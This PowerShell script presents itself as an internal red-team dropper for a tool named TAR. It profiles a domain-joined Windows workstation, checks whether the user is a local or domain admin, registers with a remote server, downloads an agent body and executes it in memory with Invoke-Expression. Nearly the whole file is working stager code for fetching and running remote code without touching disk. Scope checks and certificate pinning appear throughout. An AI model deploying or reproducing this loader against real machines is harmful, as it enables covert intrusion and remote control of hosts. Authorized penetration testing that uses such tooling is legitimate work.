#Requires -Version 5.1
<#
.SYNOPSIS
  TAR Internal Red Team — workstation dropper.
  Run once on an authorized domain-joined workstation. Validates scope,
  detects current access level, registers with the TAR server, then
  fetches the in-memory agent and invokes it. No file drops, no persistence.

.PARAMETER EngagementId
  Short identifier matching a pre-configured engagement on the server.

.PARAMETER ServerUrl
  HTTPS URL of the TAR server (e.g. https://tar.lab.local:8443).

.PARAMETER ServerCertSha256
  Expected SHA-256 thumbprint of the server TLS cert (hex, no colons).
  Pinning prevents MITM by a friendly blue team.

.PARAMETER EngagementLetterSha256
  SHA-256 of the signed engagement letter PDF, lower-hex. The server
  verifies this matches the engagement record.
#>
param(
    [Parameter(Mandatory=$true)][string]$EngagementId,
    [Parameter(Mandatory=$true)][string]$ServerUrl,
    [Parameter(Mandatory=$true)][string]$ServerCertSha256,
    [Parameter(Mandatory=$true)][string]$EngagementLetterSha256
)

$ErrorActionPreference = 'Stop'
$ProgressPreference    = 'SilentlyContinue'

# ── Cert pinning ─────────────────────────────────────────────────────────────
$PinValidator = [System.Net.Security.RemoteCertificateValidationCallback]{
    param($sender, $cert, $chain, $errors)
    $got = [System.Security.Cryptography.X509Certificates.X509Certificate2]$cert
    $thumb = ($got.GetCertHashString('SHA256')).ToLower()
    $expected = $using:ServerCertSha256.ToLower() -replace '[:\-\s]',''
    return $thumb -eq $expected
}

function Invoke-PinnedRestMethod {
    param([string]$Uri, [string]$Method='GET', $Body=$null, [string]$Token='')
    $handler = New-Object System.Net.Http.HttpClientHandler
    $handler.ServerCertificateCustomValidationCallback = $PinValidator
    $client  = New-Object System.Net.Http.HttpClient($handler)
    $client.Timeout = [System.TimeSpan]::FromSeconds(30)
    if ($Token) { $client.DefaultRequestHeaders.Authorization =
        [System.Net.Http.Headers.AuthenticationHeaderValue]::new('Bearer', $Token) }
    try {
        if ($Method -eq 'POST') {
            $json = if ($Body) { [System.Net.Http.StringContent]::new(
                ($Body | ConvertTo-Json -Compress -Depth 6),
                [System.Text.Encoding]::UTF8, 'application/json') } else {
                [System.Net.Http.StringContent]::new('', [System.Text.Encoding]::UTF8, 'application/json') }
            $resp = $client.PostAsync($Uri, $json).GetAwaiter().GetResult()
        } else {
            $resp = $client.GetAsync($Uri).GetAwaiter().GetResult()
        }
        $text = $resp.Content.ReadAsStringAsync().GetAwaiter().GetResult()
        if (-not $resp.IsSuccessStatusCode) {
            throw "HTTP $([int]$resp.StatusCode): $text"
        }
        return $text | ConvertFrom-Json
    } finally {
        $client.Dispose(); $handler.Dispose()
    }
}

# ── Access-level detection ────────────────────────────────────────────────────
function Get-AccessLevel {
    # Returns: network_only | valid_username | authenticated | local_admin | domain_admin
    $level = 'network_only'

    # Is this a domain-joined machine?
    $domainJoined = ($env:USERDNSDOMAIN -and $env:USERDOMAIN -ne $env:COMPUTERNAME)
    if (-not $domainJoined) { return $level }

    $level = 'valid_username'    # We at least have a domain user context

    # Can we actually query AD? (proves authenticated with valid ticket/creds)
    try {
        $null = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        $level = 'authenticated'
    } catch { return $level }

    # Is the current user a local administrator?
    try {
        $id  = [Security.Principal.WindowsIdentity]::GetCurrent()
        $prn = New-Object Security.Principal.WindowsPrincipal($id)
        if ($prn.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
            $level = 'local_admin'
        }
    } catch {}

    # Is the current user a domain admin?
    try {
        $dom = $env:USERDNSDOMAIN
        $me  = $env:USERNAME
        $adUser = [ADSI]"LDAP://CN=$me,CN=Users,DC=$($dom -replace '\.',',DC=')"
        $groups = $adUser.memberOf | ForEach-Object { ($_ -split ',')[0] -replace '^CN=','' }
        if ($groups -contains 'Domain Admins' -or $groups -contains 'Enterprise Admins') {
            $level = 'domain_admin'
        }
    } catch {}

    return $level
}

# ── Host profile ─────────────────────────────────────────────────────────────
$AccessLevel = Get-AccessLevel
$HostProfile = @{
    hostname        = $env:COMPUTERNAME
    domain          = $env:USERDNSDOMAIN
    username        = "$env:USERDOMAIN\$env:USERNAME"
    os_version      = [System.Environment]::OSVersion.VersionString
    ps_version      = "$($PSVersionTable.PSVersion)"
    access_level    = $AccessLevel
    engagement_id   = $EngagementId
    letter_sha256   = $EngagementLetterSha256
}
Write-Host "[TAR] Host: $($HostProfile.hostname)  Domain: $($HostProfile.domain)"
Write-Host "[TAR] Access level detected: $AccessLevel"

# ── Register with TAR server ─────────────────────────────────────────────────
Write-Host "[TAR] Registering with $ServerUrl ..."
try {
    $reg = Invoke-PinnedRestMethod -Uri "$ServerUrl/api/v1/register" `
                                   -Method POST -Body $HostProfile
} catch {
    Write-Error "[TAR] Registration failed: $_"; exit 1
}

if ($reg.status -eq 'OUT_OF_SCOPE') {
    Write-Warning "[TAR] Scope check failed — this host is not in the engagement scope. Exiting."
    exit 2
}
if (-not $reg.agent_id) {
    Write-Error "[TAR] Server returned no agent_id. Exiting."; exit 1
}

$AgentId  = $reg.agent_id
$AgentKey = $reg.agent_key
Write-Host "[TAR] Registered. agent_id=$AgentId"

# ── Fetch agent body (HMAC-verified) ─────────────────────────────────────────
Write-Host "[TAR] Fetching agent body ..."
try {
    $agentResp = Invoke-PinnedRestMethod `
        -Uri "$ServerUrl/api/v1/agent?id=$AgentId" `
        -Token $AgentKey
} catch {
    Write-Error "[TAR] Failed to fetch agent: $_"; exit 1
}

$AgentBody = $agentResp.body
$AgentHmac = $agentResp.hmac
if (-not $AgentBody) { Write-Error "[TAR] Empty agent body."; exit 1 }

# Verify HMAC-SHA256 of agent body before executing anything
$hmacAlg = New-Object System.Security.Cryptography.HMACSHA256
$hmacAlg.Key = [System.Text.Encoding]::UTF8.GetBytes($AgentKey)
$computedHmac = [System.BitConverter]::ToString(
    $hmacAlg.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($AgentBody))
).Replace('-','').ToLower()

if ($computedHmac -ne $AgentHmac.ToLower()) {
    Write-Error "[TAR] HMAC verification failed — agent body may be tampered. Exiting."
    exit 3
}
Write-Host "[TAR] Agent HMAC verified. Invoking in-memory ..."

# ── Invoke agent in-memory (no disk write) ───────────────────────────────────
$Global:TarConfig = @{
    EngagementId = $EngagementId
    AgentId      = $AgentId
    AgentKey     = $AgentKey
    ServerUrl    = $ServerUrl
    CertPin      = $ServerCertSha256
    AccessLevel  = $AccessLevel
    HostProfile  = $HostProfile
}

Invoke-Expression $AgentBody

# Dropper exits; agent body's main loop takes over in this runspace.
